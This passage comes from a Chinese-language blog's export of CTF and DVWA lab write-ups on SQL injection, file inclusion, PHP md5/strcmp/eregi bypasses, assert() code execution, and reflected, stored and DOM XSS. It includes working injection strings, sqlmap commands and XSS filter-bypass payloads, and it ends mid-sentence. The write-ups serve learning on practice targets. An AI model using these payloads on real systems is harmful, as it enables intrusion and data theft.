初步猜测大致为： select $query xxx from Flag 3.尝试用逗号隔开查询列数 输入10,2 输入 10,8,6 我们发现我们输入的最后一个数返回的本应该是其本身，但是这里无论输入什么返回都是1 于是我们猜测：select $query ||1 from Flag 我们知道select *from Flag是获取Flag的所有内容 那么此处我们可以构造payload：$query=*,1 （代入查询语句中就是：select *,1 ||1 from Flag 等价于：select *from Flag） 最终得： 这边有一点注意： 这也是为什么上面第3点为什么我们输入的前几位都是返回其本身 其实还有一种，但是我感觉更麻烦，留一个payload吧：1;set sql_mode=pipes_as_concat; select 1 参考博客：https://blog.csdn.net/ratear/article/details/109560061","tags":[{"name":"刷题","slug":"刷题","permalink":"http://example.com/tags/%E5%88%B7%E9%A2%98/"}]},{"title":"正则匹配","date":"2021-04-04T08:04:04.000Z","path":"2021/04/04/正则表达式/","text":"正则表达式：描述了一种字符串匹配的模式（pattern），可以用来检查一个串是否含有某种子串、将匹配的子串替换或者从某个串中取出符合某个条件的子串等。 正则表达式常用修饰符： 修饰符 含义 描述 i ignore - 不区分大小写 将匹配设置为不区分大小写，搜索时不区分大小写: A 和 a 没有区别。 g global - 全局匹配 查找所有的匹配项。 m multi line - 多行匹配 使边界字符 ^ 和 $ 匹配每一行的开头和结尾，记住是多行，而不是整个字符串的开头和结尾。 s 特殊字符圆点 . 中包含换行符 \\n 默认情况下的圆点 . 是 匹配除换行符 \\n 之外的任何字符，加上 s 修饰符之后, . 中包含换行符 \\n。 常见的正则匹配字符: 字符 描述 \\ 将下一个字符标记为一个特殊字符、或一个原义字符、或一个 向后引用、或一个八进制转义符。例如，’n’ 匹配字符 “n”。’\\n’ 匹配一个换行符。序列 ‘\\\\‘ 匹配 “\\“ 而 “\\(“ 则匹配 “(“。 ^ 匹配输入字符串的开始位置。如果设置了 RegExp 对象的 Multiline 属性，^ 也匹配 ‘\\n’ 或 ‘\\r’ 之后的位置。 $ 匹配输入字符串的结束位置。如果设置了RegExp 对象的 Multiline 属性，$ 也匹配 ‘\\n’ 或 ‘\\r’ 之前的位置。 \\d 匹配一个数字字符。等价于 [0-9]。 \\d+ 匹配多个数字。 \\D 匹配一个非数字字符。等价于 [ ^0-9]。 x|y 匹配 x 或 y。例如，’z|food’ 能匹配 “z” 或 “food”。’(z|f)ood’ 则匹配 “zood” 或 “food”。 [xyz] 字符集合。匹配所包含的任意一个字符。例如， ‘[abc]’ 可以匹配 “plain” 中的 ‘a’。 [^xyz] 负值字符集合。匹配未包含的任意字符。例如， ‘[ ^abc]’ 可以匹配 “plain” 中的’p’、’l’、’i’、’n’。 [a-z] 字符范围。匹配指定范围内的任意字符。例如，’[a-z]’ 可以匹配 ‘a’ 到 ‘z’ 范围内的任意小写字母字符。 [^a-z] 负值字符范围。匹配任何不在指定范围内的任意字符。例如，’[ ^a-z]’ 可以匹配任何不在 ‘a’ 到 ‘z’ 范围内的任意字符。 * 匹配前面的子表达式零次或多次。例如，zo* 能匹配 “z” 以及 “zoo”。* 等价于{0,}。 + 匹配前面的子表达式一次或多次。例如，’zo+’ 能匹配 “zo” 以及 “zoo”，但不能匹配 “z”。+ 等价于 {1,}。 {n} n 是一个非负整数。匹配确定的 n 次。例如，’o{2}’ 不能匹配 “Bob” 中的 ‘o’，但是能匹配 “food” 中的两个 o。 {n,} n 是一个非负整数。至少匹配n 次。例如，’o{2,}’ 不能匹配 “Bob” 中的 ‘o’，但能匹配 “foooood” 中的所有 o。’o{1,}’ 等价于 ‘o+’。’o{0,}’ 则等价于 ‘o*’。 {n,m} m 和 n 均为非负整数，其中n &lt;= m。最少匹配 n 次且最多匹配 m 次。例如，”o{1,3}” 将匹配 “fooooood” 中的前三个 o。’o{0,1}’ 等价于 ‘o?’。请注意在逗号和两个数之间不能有空格。 . 匹配任何字符，换行符（\\n、\\r）除外。 PHP的正则表达式有一些内置的通用字符簇，列表如下： 字符簇 描述 [[:alpha:]] 任何字母 [[:digit:]] 任何数字 [[:alnum:]] 任何字母和数字 [[:space:]] 任何空白字符 [[:upper:]] 任何大写字母 [[:lower:]] 任何小写字母 [[:punct:]] 任何标点符号 [[:xdigit:]] 任何16进制的数字，相当于[0-9a-fA-F] sp： php的正则表达式需要放在// 之间 参考：https://www.runoob.com/regexp/regexp-tutorial.html","tags":[{"name":"刷题","slug":"刷题","permalink":"http://example.com/tags/%E5%88%B7%E9%A2%98/"}]},{"title":"JS","date":"2021-03-18T10:52:29.000Z","path":"2021/03/18/DVWA—JS/","text":"前言：javascript一种常用于页面代码中，用来实现动态效果的脚本语言。由于JS是存储在客户端，所以过分依赖JS代码逻辑，容易被攻击者获取代码后，进行数据伪造。 Low：先提交默认数据 提交success 无效的token怎么回事呢？查看网页源码 我们看到token由前端生成，与服务器无关，但是前端的token是根据ChangeMe来生成的，而服务器要的token是根据success生成的。 利用控制台执行代码 我们将箭号所指的token的值用上面弹框中的值替换 Medium：http://www.bubuko.com/infodetail-2905900.html","tags":[{"name":"DVWA—labs","slug":"DVWA—labs","permalink":"http://example.com/tags/DVWA%E2%80%94labs/"}]},{"title":"CSP","date":"2021-03-18T10:40:08.000Z","path":"2021/03/18/DVWA—CSP/","text":"Content-Security-Policy指的是内容安全检测，又称网页安全政策，CSP的实质就是白名单制度。 Content-Security-Policy（内容安全策略）是指HTTP返回报文头中的标签，浏览器会根据标签中的内容，判断哪些资源可以加载或执行。是为了缓解潜在的跨站脚本问题（XSS）。原来应对XSS攻击时，主要采用函数过滤、转义输入中的特殊字符、标签、文本来规避攻击。CSP的实质就是白名单制度，开发人员明确告诉客户端，哪些外部资源可以加载和执行。开发者只需要提供配置，实现和执行全部由浏览器完成。简而言之就是在前端添加一些标签，告诉浏览器哪些资源可以加载访问。","tags":[{"name":"dvwa—labs","slug":"dvwa—labs","permalink":"http://example.com/tags/dvwa%E2%80%94labs/"}]},{"title":"bugku(1)","date":"2021-03-16T14:56:40.000Z","path":"2021/03/16/bugku1/","text":"web11：（御剑扫描后端） 这题的题目是：网站被黑了 黑客会不会留下后门 那么我们要借助御剑这个后门扫描工具，扫描目标网站，发现有个shell.php文件 访问shell.php 用bp抓包爆破可知密码为hack pass为hack，登入 web13：（url解码）题目叫我们看看源码，我们看看源码： 我们对其url解码： 12345678910function checkSubmit()&#123;var a=document.getElementById(&quot;password&quot;);if(&quot;undefined&quot;!=typeof a)&#123; if(&quot;67d709b2b54aa2aa648cf6e87a7114f1&quot;==a.value) return!0; alert(&quot;Error&quot;); a.focus(); return!1&#125;&#125;document.getElementById(&quot;levelQuest&quot;).onsubmit=checkSubmit; 提交字符串67d709b2b54aa2aa648cf6e87a7114f1 web14：（文件包含加php://filter）进入题目，看到 点击click me？ no跳转 发现是文件包含题。 补充 include()函数对文件后缀名无要求，而对其中的语法有要求，即使后缀名为txt，jpg也会被当做php文件解析，只要文件内是形式就可以执行，但是如果不是php语法的形式，即使后缀为php，也无法执行。 php://filter 设计用来过滤筛选文件。如果想要读取运行php文件的源码，需要先对该php文件内容base64编码，再传入include函数，这样就不会被认为是php代码，不会执行，会输出文件的base64编码，后续再解码即可获得源码。 故本题payload为：php://filter/read=convert.base64-encode/resource=index.php base64解码： 参考博客: https://blog.csdn.net/zpy1998zpy/article/details/80598768 https://www.freebuf.com/column/148886.html web16：（MD5()函数绕过）进入环境后发现就一串数字，其他什么也没有，检查网页源码，抓包看回显都没有什么线索，又用御剑扫描网页后台 发现一个.bak拓展名（bak这种备份文件在我们平常使用绘图、编程软件时都会默认创建备份文件，如cad文件修改后会产生bak文件，wps、word等文件修改后也都会产生bak备份文件，这样可以保证当源文件不小心被删掉或者出现故障导致无故自动退出时，还可以从bak备份文件继续编辑，减少了不少误操作带来的损失。）的文件，结合描述的信息：备份是个好习惯，我们可以猜测这个.bak拓展名文件应该有东西 下载文件并打开 我们可以看到key1和key2本身不能相等，但是被md5编码后两者要相等才能得到flag。 总的来说这是一道文件包含漏洞+绕过字符串过滤+绕过md5编码的题 我们用双写绕过字符串过滤，利用md5()函数无法处理数组（如果传入的为数组，会返回NULL，所以两个数组经过加密后得到的都是NULL,也就是相等的。）达成if条件。 因此我们的payload是?kekeyy1[]=1&amp;kekeyy2[]=2 web17:(sql注入——post型)1.手工注入：查数字段值：0’ union select 1,2,3,4# 爆库：0’ union select 1,2,3,database()# 爆表：0’ union select 1,2,3,group_concat(table_name) from information_schema.talbes where table_schema=’skctf’# 爆列：0’ union select 1,2,3,group_concat(column_name) from information_schema.tables where table_name=fl4g# 爆值：0’ union select 1,2,3,skctf_flag form fl4g# 2.sqlmap爆库：sqlmap.py -u &quot;http://114.67.246.176:12115&quot; --batch --data &quot;id=1&quot; --current-db 爆表：sqlmap.py -u &quot;http://114.67.246.176:12115&quot; --batch --data &quot;id=1&quot; -D skctf --tables 爆列：sqlmap.py -u &quot;http://114.67.246.176:12115&quot; --batch --data &quot;id=1&quot; -D skctf -T fl4g --columns 爆值：sqlmap.py -u &quot;http://114.67.246.176:12115&quot; --batch --data &quot;id=1&quot; -D skctf -T fl4g -C skctf_flag --dump Web20（line控制返回内容）打开题目地址发现是一堆乱码，我还以为乱码里面有内容，分析了一通，结果什么也没有。 注意到url栏filename的值好像被编码了，base64解码得keys.txt。 变量line的值为多少就返回指定文件中第几行，无值时默认返回第0行 一般index.php都会存在源码，编码index.php 返回index.php第一行源码，只要不断更改line的值最终就可以获得完整的index.php源码（因为我不会写python脚本） index.php源码： 12345678910111213141516171819&lt;?php error_reporting(0);$file=base64_decode(isset($_GET[&#x27;filename&#x27;])?$_GET[&#x27;filename&#x27;]:&quot;&quot;);$line=isset($_GET[&#x27;line&#x27;])?intval($_GET[&#x27;line&#x27;]):0;if($file==&#x27;&#x27;) header(&quot;location:index.php?line=&amp;filename=a2V5cy50eHQ=&quot;);$file_list = array(&#x27;0&#x27; =&gt;&#x27;keys.txt&#x27;,&#x27;1&#x27; =&gt;&#x27;index.php&#x27;,);if(isset($_COOKIE[&#x27;margin&#x27;]) &amp;&amp; $_COOKIE[&#x27;margin&#x27;]==&#x27;margin&#x27;)&#123;$file_list[2]=&#x27;keys.php&#x27;;&#125;if(in_array($file, $file_list))&#123;$fa = file($file);echo $fa[$line];&#125;?&gt; 我们看到当cookie内容为参数margin=margin时，file_list数组会多一个键值keys.php，然后通过in_array函数检测我们上传的文件名是否在file_list数组中，是则发送key.php文件的内容。 因此我们构造cookie：margin=margin，令filename的值为key.php base64编码后的值。 web21：（编码+加条件绕过）打开题目地址做的第一件就是查看网页源码 发现有一个1p.html文件，打开是一段HTML代码 1234567891011121314151617181920&lt;HTML&gt;&lt;HEAD&gt;&lt;SCRIPT LANGUAGE=&quot;Javascript&quot;&gt;&lt;!--var Words =&quot;%3Cscript%3Ewindow.location.href%3D&#x27;http%3A%2F%2Fwww.bugku.com&#x27;%3B%3C%2Fscript%3E%20%0A%3C!--JTIyJTNCaWYoISUyNF9HRVQlNUInaWQnJTVEKSUwQSU3QiUwQSUwOWhlYWRlcignTG9jYXRpb24lM0ElMjBoZWxsby5waHAlM0ZpZCUzRDEnKSUzQiUwQSUwOWV4aXQoKSUzQiUwQSU3RCUwQSUyNGlkJTNEJTI0X0dFVCU1QidpZCclNUQlM0IlMEElMjRhJTNEJTI0X0dFVCU1QidhJyU1RCUzQiUwQSUyNGIlM0QlMjRfR0VUJTVCJ2InJTVEJTNCJTBBaWYoc3RyaXBvcyglMjRhJTJDJy4nKSklMEElN0IlMEElMDllY2hvJTIwJ25vJTIwbm8lMjBubyUyMG5vJTIwbm8lMjBubyUyMG5vJyUzQiUwQSUwOXJldHVybiUyMCUzQiUwQSU3RCUwQSUyNGRhdGElMjAlM0QlMjAlNDBmaWxlX2dldF9jb250ZW50cyglMjRhJTJDJ3InKSUzQiUwQWlmKCUyNGRhdGElM0QlM0QlMjJidWdrdSUyMGlzJTIwYSUyMG5pY2UlMjBwbGF0ZWZvcm0hJTIyJTIwYW5kJTIwJTI0aWQlM0QlM0QwJTIwYW5kJTIwc3RybGVuKCUyNGIpJTNFNSUyMGFuZCUyMGVyZWdpKCUyMjExMSUyMi5zdWJzdHIoJTI0YiUyQzAlMkMxKSUyQyUyMjExMTQlMjIpJTIwYW5kJTIwc3Vic3RyKCUyNGIlMkMwJTJDMSkhJTNENCklMEElN0IlMEElMDklMjRmbGFnJTIwJTNEJTIwJTIyZmxhZyU3QioqKioqKioqKioqJTdEJTIyJTBBJTdEJTBBZWxzZSUwQSU3QiUwQSUwOXByaW50JTIwJTIybmV2ZXIlMjBuZXZlciUyMG5ldmVyJTIwZ2l2ZSUyMHVwJTIwISEhJTIyJTNCJTBBJTdEJTBBJTBBJTBBJTNGJTNF--%3E&quot; function OutWord()&#123;var NewWords;NewWords = unescape(Words);document.write(NewWords);&#125; OutWord();// --&gt;&lt;/SCRIPT&gt;&lt;/HEAD&gt;&lt;BODY&gt;&lt;/BODY&gt;&lt;/HTML&gt; 我们看到word一大串字符串很可疑，结合后面的unescape()函数，断定这里被编码了 用burp解码，顺序为：url解码，base64解码，再url解码 最终得 12345678910111213141516171819202122232425&lt;!--&quot;;if(!$_GET[&#x27;id&#x27;])&#123; header(&#x27;Location: hello.php?id=1&#x27;); exit();&#125;$id=$_GET[&#x27;id&#x27;];$a=$_GET[&#x27;a&#x27;];$b=$_GET[&#x27;b&#x27;];if(stripos($a,&#x27;.&#x27;))&#123; echo &#x27;no no no no no no no&#x27;; return ;&#125;$data = @file_get_contents($a,&#x27;r&#x27;);if($data==&quot;bugku is a nice plateform!&quot; and $id==0 and strlen($b)&gt;5 and eregi(&quot;111&quot;.substr($b,0,1),&quot;1114&quot;) and substr($b,0,1)!=4)&#123; $flag = &quot;flag&#123;***********&#125;&quot;&#125;else&#123; print &quot;never never never give up !!!&quot;;&#125;?&gt;--&gt; file_get_contents() 函数：把整个文件读入一个字符串中。 eregi() 作用：不分大小写的正则表达式匹配——在 string 中寻找与给定的正则表达式 pattern 所匹配的子串。 语法：ereg ( string $pattern , string $string , array &amp;$regs = ? ) 代码审计：当id为空时，网页自动跳转到指定文件；参数a中不得有.，否则输出‘no’（这限制了我们直接导入文件）；接着将a的值赋值给参数data；if条件规定：data的值为bugku is a nice plateform!，id的值为0，b值的长度大于5，然后111和b值的第一个字符结合与1114进行匹配，并且b值的第一个字符不能是4。 ereg和eregi的截断漏洞：%00截断及遇到%00则默认为字符串的结束。因此我们构造b=%0023456 php中会把id=0当成id=nothing，也就是空白。那么这题!$_GET[&#39;id&#39;]和$id==0明显冲突矛盾，这时我们要想到PHP在处理哈希字符串时，会利用”!=”或”==”来对哈希值进行比较，它把每一个以”0E”开头的哈希值都解释为0，所以如果两个不同的密码经过哈希以后，其哈希值都是以”0E”开头的，那么PHP将会认为他们相同，都是0。因此我们可以构造：?id=0e1 由于if条件规定：data的值为bugku is a nice plateform!因此我们可以利用php://input获取post上传数据的特点， 令?a=php://input并post数据bugku is a nice plateform! 综上所述：payload=?id=0e1&amp;a=php://input&amp;b=%0023456 并post数据bugku is a nice plateform! web22（assert()函数漏洞利用）点开题目发现题目描述那段话： 1234$poc&#x3D;&quot;a#s#s#e#r#t&quot;; $poc_1&#x3D;explode(&quot;#&quot;,$poc); $poc_2&#x3D;$poc_1[0].$poc_1[1].$poc_1[2].$poc_1[3].$poc_1[4].$poc_1[5]; $poc_2($_GET[&#39;s&#39;]) 以上代码最终等价执行语句：assert($_GET[&#39;s&#39;]) 补充：assert()函数会将括号内的字符串当作php代码执行。 详情参考：https://www.smi1e.top/%E6%B5%85%E8%B0%88eval%E5%92%8Cassert/ 那么我们可以根据assert()函数的特性，构造payload：?s=system(ls)或?s=system(dir) 访问flaga15808abee46a1d5.txt，得flag web23：（正则表达式）打开题目地址： 我们看到一个正则表达式：/key.*key.&#123;4,7&#125;key:\\/.\\/(.*key)[a-z][[:punct:]]/i，当我们输入的id值满足正则匹配是会输出flag 我们可以把这个正则表达式拆分成：key . * key .&#123;4,7&#125; key : / . / . * key [a-z] [[:punct:]] 分析（从左到右）： key——就是key . ——任意字符 *——匹配前面的子表达式零次或多次 key——就是key .&#123;4,7&#125;——匹配任意字符4到7次 key——就是key :——就是: /——就是/ . ——任意字符 /——就是/ . ——任意字符 *——匹配前面的子表达式零次或多次 key——就是key [a-z]——匹配a-z之间的字母 [[:punct:]]——匹配任意标点符号 依次我们构造payload，以get的方式传参id：?id=key1key1111key:/1/1keya! （payload不唯一） web24：（md5绕过+strcmp函数绕过）打开题目地址，查看源码： 点开code.txt 我们看到有三个参数：v1,v2,v3 要满足条件： 1.v1!=v2 2.md5(v1)=mad5(v2) 3.v3的值等于flag 绕条件1,2 法1：通过数组绕过md5函数加密，如v1[]=1,v2[]=2 法2：利用php弱口令特性，会将0e开头的哈希值都解析为0。常见的md5加密后以0e开头的字符串：240610708、QNKCDZO、aabg7XSs、aabC9RqS等 绕过条件3 利用strcmp函数不能比较数组（比较数组返回为空，及零），构造v3[]=flag 综上，构造flag：?v1[]=1&amp;v2[]=2&amp;v3[]=flag或?v1=240610708&amp;v2=QNKCDZO&amp;v3[]=flag","tags":[{"name":"bugku","slug":"bugku","permalink":"http://example.com/tags/bugku/"}]},{"title":"DVWA—XSS","date":"2021-03-13T02:35:57.000Z","path":"2021/03/13/DVWA—XSS/","text":"前言：—）XSS的中文名称叫跨站脚本，是WEB漏洞中比较常见的一种，特点就是可以将恶意HTML/JavaScript代码注入到受害用户浏览的网页上，从而达到劫持用户会话的目的。实际应用中xss可以完成很多操作，这里举两个例子。 窃取网页浏览中的cookie值 在网页浏览中我们常常涉及到用户登录，登录完毕之后服务端会返回一个cookie值。这个cookie值相当于一个令牌，拿着这张令牌就等同于证明了你是某个用户。 如果你的cookie值被窃取，那么攻击者很可能能够直接利用你的这张令牌不用密码就登录你的账户。如果想要通过script脚本获得当前页面的cookie值，通常会用到document.cookie。 试想下如果像空间说说中能够写入xss攻击语句，那岂不是看了你说说的人的号你都可以登录（不过某些厂商的cookie有其他验证措施如：Http-Only保证同一cookie不能被滥用） 劫持流量实现恶意跳转 这个很简单，就是在网页中想办法插入一句像这样的语句： 1&lt;script&gt;window.location.href=&quot;http://www.baidu.com&quot;;&lt;/script&gt; 那么所访问的网站就会被跳转到百度的首页。【摘自https://zhuanlan.zhihu.com/p/26177815】 —）XSS根据恶意脚本的传递方式可以分为3种，分别为反射型、存储型、DOM型，前面两种恶意脚本都会经过服务器端然后返回给客户端，相对DOM型来说比较好检测与防御，而DOM型不用将恶意脚本传输到服务器在返回客户端。 DOM-based XSS：漏洞是基于文档对象模型Document Objeet Model，DOM)的一种漏洞。DOM是一个与平台、编程语言无关的接口，它允许程序或脚本动态地访问和更新文档内容、结构和样式，处理后的结果能够成为显示页面的一部分。DOM中有很多对象，其中一些是用户可以操纵的，如url，location，referer等。客户端的脚本程序可以通过DOM动态地检查和修改页面内容，它不依赖于提交数据到服务器端，而从客户端获得DOM中的数据在本地执行，如果DOM中的数据没有经过严格确认，就会产生DOM-based XSS漏洞。 反射型XSS：&lt;非持久化&gt; 攻击者事先制作好攻击链接, 需要欺骗用户自己去点击链接才能触发XSS代码（服务器中没有这样的页面和内容），一般容易出现在搜索页面。 存储型XSS：&lt;持久化&gt; 代码是存储在服务器中的，如在个人信息或发表文章等地方，加入代码，如果没有过滤或过滤不严，那么这些代码将储存到服务器中，每当有用户访问该页面的时候都会触发代码执行，这种XSS非常危险，容易造成蠕虫，大量盗窃cookie（虽然还有种DOM型XSS，但是也还是包括在存储型XSS内）。 作者：Jewel591 链接：https://www.jianshu.com/p/4fcb4b411a66 来源：简书 著作权归作者所有。商业转载请联系作者获得授权，非商业转载请注明出处。 ReflectedLow：查看源码： 1234567891011&lt;?phpheader (&quot;X-XSS-Protection: 0&quot;);// Is there any input?if( array_key_exists( &quot;name&quot;, $_GET ) &amp;&amp; $_GET[ &#x27;name&#x27; ] != NULL ) &#123; // Feedback for end user echo &#x27;&lt;pre&gt;Hello &#x27; . $_GET[ &#x27;name&#x27; ] . &#x27;&lt;/pre&gt;&#x27;;&#125;?&gt; 新函数 array_key_exists()函数 功能：检查某个数组中是否存在指定的键名，如果键名存在则返回 true，如果键名不存在则返回 false。 语法：array_key_exists(key,array) 参数 描述 key 必需。规定键名。 array 必需。规定数组。 我们可以看到对我们输入的数据没有进行过滤，在框内输入&lt;script&gt;alert(1);&lt;/script&gt; 直接获取用户的cookie：&lt;script&gt;alert(document.cookie)&lt;/script&gt; Medium：查看源码： 1234567891011121314&lt;?phpheader (&quot;X-XSS-Protection: 0&quot;);// Is there any input?if( array_key_exists( &quot;name&quot;, $_GET ) &amp;&amp; $_GET[ &#x27;name&#x27; ] != NULL ) &#123; // Get input $name = str_replace( &#x27;&lt;script&gt;&#x27;, &#x27;&#x27;, $_GET[ &#x27;name&#x27; ] ); // Feedback for end user echo &quot;&lt;pre&gt;Hello $&#123;name&#125;&lt;/pre&gt;&quot;;&#125;?&gt; 我们看到服务器对&lt;script&gt;进行了过滤处理，但是我们双写绕过就好了：&lt;script&lt;script&gt;&gt;alert(1);&lt;/script&gt; 或者大小写绕过：&lt;Script&gt;alert(1);&lt;/script&gt; High：1234567891011121314&lt;?phpheader (&quot;X-XSS-Protection: 0&quot;);// Is there any input?if( array_key_exists( &quot;name&quot;, $_GET ) &amp;&amp; $_GET[ &#x27;name&#x27; ] != NULL ) &#123; // Get input $name = preg_replace( &#x27;/&lt;(.*)s(.*)c(.*)r(.*)i(.*)p(.*)t/i&#x27;, &#x27;&#x27;, $_GET[ &#x27;name&#x27; ] ); // Feedback for end user echo &quot;&lt;pre&gt;Hello $&#123;name&#125;&lt;/pre&gt;&quot;;&#125;?&gt; 我们可以看到服务器使用了正则表达式禁用了标签，但是我们还可以通过img、body等标签的事件或者iframe等标签的src注入恶意的js代码。常用的HTML标签事件还有onerror,oneclick,onmouseover,onload等， 格式如下：onerror/onclick/onmouseover/onload=“执行内容” 1）&lt;img src=&quot;&quot; onerror=alert(&#39;1&#39;)&gt; src 属性规定外部脚本文件的 URL。 onerror 事件在视频/音频（audio/video）数据加载期间发生错误时触发。 这句话的意思是当加载img图片失败时执行onerror后的代码。 2）&lt;body onload=alert(&#39;1&#39;)&gt; onload 事件会在页面或图像加载完成后立即发生。 3）&lt;a href=&#39;&#39; onclick=alert(&#39;1&#39;)&gt;click me&lt;/a&gt; href是Hypertext Reference的缩写。意思是指定超链接目标的URL。href 属性的值可以是任何有效文档的相对或绝对URL，包括片段标识符和JavaScript代码段。 onclick 事件会在元素被点击时发生 这句话中元素的名称为click me，当点击click me时会执行onclick后面的代码。 4）Iframe:&lt;body onload=alert(1)&gt; iframe:一个内联框架被用来在当前 HTML 文档中嵌入另一个文档。一个内联框架被用来在当前 HTML 文档中嵌入另一个文档。 5）&lt;body onmousemove=alert(&#39;1&#39;)&gt; onmousemove 事件会在鼠标指针移到指定的对象时发生。 这句话有点没明白。 StoredLow：查看源码： 12345678910111213141516171819202122&lt;?phpif( isset( $_POST[ &#x27;btnSign&#x27; ] ) ) &#123; // Get input $message = trim( $_POST[ &#x27;mtxMessage&#x27; ] ); $name = trim( $_POST[ &#x27;txtName&#x27; ] ); // Sanitize message input $message = stripslashes( $message ); $message = ((isset($GLOBALS[&quot;___mysqli_ston&quot;]) &amp;&amp; is_object($GLOBALS[&quot;___mysqli_ston&quot;])) ? mysqli_real_escape_string($GLOBALS[&quot;___mysqli_ston&quot;], $message ) : ((trigger_error(&quot;[MySQLConverterToo] Fix the mysql_escape_string() call! This code does not work.&quot;, E_USER_ERROR)) ? &quot;&quot; : &quot;&quot;)); // Sanitize name input $name = ((isset($GLOBALS[&quot;___mysqli_ston&quot;]) &amp;&amp; is_object($GLOBALS[&quot;___mysqli_ston&quot;])) ? mysqli_real_escape_string($GLOBALS[&quot;___mysqli_ston&quot;], $name ) : ((trigger_error(&quot;[MySQLConverterToo] Fix the mysql_escape_string() call! This code does not work.&quot;, E_USER_ERROR)) ? &quot;&quot; : &quot;&quot;)); // Update database $query = &quot;INSERT INTO guestbook ( comment, name ) VALUES ( &#x27;$message&#x27;, &#x27;$name&#x27; );&quot;; $result = mysqli_query($GLOBALS[&quot;___mysqli_ston&quot;], $query ) or die( &#x27;&lt;pre&gt;&#x27; . ((is_object($GLOBALS[&quot;___mysqli_ston&quot;])) ? mysqli_error($GLOBALS[&quot;___mysqli_ston&quot;]) : (($___mysqli_res = mysqli_connect_error()) ? $___mysqli_res : false)) . &#x27;&lt;/pre&gt;&#x27; ); //mysql_close();&#125;?&gt; 我们可以看到服务器对我们上传的数据做了过滤处理防止我们sql注入。但是没有预防xss， 在message栏输入：&lt;script&gt;alert(1);&lt;/script&gt; Medium：查看源码： 123456789101112131415161718192021222324&lt;?phpif( isset( $_POST[ &#x27;btnSign&#x27; ] ) ) &#123; // Get input $message = trim( $_POST[ &#x27;mtxMessage&#x27; ] ); $name = trim( $_POST[ &#x27;txtName&#x27; ] ); // Sanitize message input $message = strip_tags( addslashes( $message ) ); $message = ((isset($GLOBALS[&quot;___mysqli_ston&quot;]) &amp;&amp; is_object($GLOBALS[&quot;___mysqli_ston&quot;])) ? mysqli_real_escape_string($GLOBALS[&quot;___mysqli_ston&quot;], $message ) : ((trigger_error(&quot;[MySQLConverterToo] Fix the mysql_escape_string() call! This code does not work.&quot;, E_USER_ERROR)) ? &quot;&quot; : &quot;&quot;)); $message = htmlspecialchars( $message ); // Sanitize name input $name = str_replace( &#x27;&lt;script&gt;&#x27;, &#x27;&#x27;, $name ); $name = ((isset($GLOBALS[&quot;___mysqli_ston&quot;]) &amp;&amp; is_object($GLOBALS[&quot;___mysqli_ston&quot;])) ? mysqli_real_escape_string($GLOBALS[&quot;___mysqli_ston&quot;], $name ) : ((trigger_error(&quot;[MySQLConverterToo] Fix the mysql_escape_string() call! This code does not work.&quot;, E_USER_ERROR)) ? &quot;&quot; : &quot;&quot;)); // Update database $query = &quot;INSERT INTO guestbook ( comment, name ) VALUES ( &#x27;$message&#x27;, &#x27;$name&#x27; );&quot;; $result = mysqli_query($GLOBALS[&quot;___mysqli_ston&quot;], $query ) or die( &#x27;&lt;pre&gt;&#x27; . ((is_object($GLOBALS[&quot;___mysqli_ston&quot;])) ? mysqli_error($GLOBALS[&quot;___mysqli_ston&quot;]) : (($___mysqli_res = mysqli_connect_error()) ? $___mysqli_res : false)) . &#x27;&lt;/pre&gt;&#x27; ); //mysql_close();&#125;?&gt; 新函数 htmlspecialchars()函数：把预定义的字符 “&lt;” （小于）和 “&gt;” （大于）转换为 HTML 实体。 strip_tags()函数：剥去字符串中的 HTML 标签。 我们可以看到js不会再把我们从message处上传的危险内容当作代码解析了，而且服务器对name也进行了过滤处理，但是我们还是可以通过双写和大小写绕过。但是这里我们发现name有输入字数限制，那我们就抓包修改name的值， 然后提交即可 High：查看源码： 123456789101112131415161718192021222324&lt;?phpif( isset( $_POST[ &#x27;btnSign&#x27; ] ) ) &#123; // Get input $message = trim( $_POST[ &#x27;mtxMessage&#x27; ] ); $name = trim( $_POST[ &#x27;txtName&#x27; ] ); // Sanitize message input $message = strip_tags( addslashes( $message ) ); $message = ((isset($GLOBALS[&quot;___mysqli_ston&quot;]) &amp;&amp; is_object($GLOBALS[&quot;___mysqli_ston&quot;])) ? mysqli_real_escape_string($GLOBALS[&quot;___mysqli_ston&quot;], $message ) : ((trigger_error(&quot;[MySQLConverterToo] Fix the mysql_escape_string() call! This code does not work.&quot;, E_USER_ERROR)) ? &quot;&quot; : &quot;&quot;)); $message = htmlspecialchars( $message ); // Sanitize name input $name = preg_replace( &#x27;/&lt;(.*)s(.*)c(.*)r(.*)i(.*)p(.*)t/i&#x27;, &#x27;&#x27;, $name ); $name = ((isset($GLOBALS[&quot;___mysqli_ston&quot;]) &amp;&amp; is_object($GLOBALS[&quot;___mysqli_ston&quot;])) ? mysqli_real_escape_string($GLOBALS[&quot;___mysqli_ston&quot;], $name ) : ((trigger_error(&quot;[MySQLConverterToo] Fix the mysql_escape_string() call! This code does not work.&quot;, E_USER_ERROR)) ? &quot;&quot; : &quot;&quot;)); // Update database $query = &quot;INSERT INTO guestbook ( comment, name ) VALUES ( &#x27;$message&#x27;, &#x27;$name&#x27; );&quot;; $result = mysqli_query($GLOBALS[&quot;___mysqli_ston&quot;], $query ) or die( &#x27;&lt;pre&gt;&#x27; . ((is_object($GLOBALS[&quot;___mysqli_ston&quot;])) ? mysqli_error($GLOBALS[&quot;___mysqli_ston&quot;]) : (($___mysqli_res = mysqli_connect_error()) ? $___mysqli_res : false)) . &#x27;&lt;/pre&gt;&#x27; ); //mysql_close();&#125;?&gt; 感觉和Flected类型High级别的绕过方法差不多，不再赘述了。 DOMLow：查看服务器端源码： 12345&lt;?php# No protections, anything goes?&gt; 服务器端没有任何php源码，因此用户输入全由前端js处理 查看前端源码：![1](DVWA—DOM Based Cross Site Scripting (XSS)/1.png) 我们可以看到前端通过GET的方式获取参数default的值，因此我们在url栏构造payload![2](DVWA—DOM Based Cross Site Scripting (XSS)/2.png) 新函数： alert()函数 功能：用于显示带有一条指定消息和一个确定按钮的警告框。 语法：alert(message) 参数 描述 message 要在 window 上弹出的对话框中显示的纯文本（而非 HTML 文本） Medium：查看源码： 1234567891011121314&lt;?php// Is there any input?if ( array_key_exists( &quot;default&quot;, $_GET ) &amp;&amp; !is_null ($_GET[ &#x27;default&#x27; ]) ) &#123; $default = $_GET[&#x27;default&#x27;]; # Do not allow script tags if (stripos ($default, &quot;&lt;script&quot;) !== false) &#123; header (&quot;location: ?default=English&quot;); exit; &#125;&#125;?&gt; 这道题搞了好久，一步一步来吧 1）先看网页源码： 2）尝试用之前学过的换标签的方式绕过：&lt;img src=1 oneeror=alert(1)&gt; 发现不会像之前一样有弹窗跳出来，原因是我们的代码被标签包裹了，因此我们尝试提前闭合 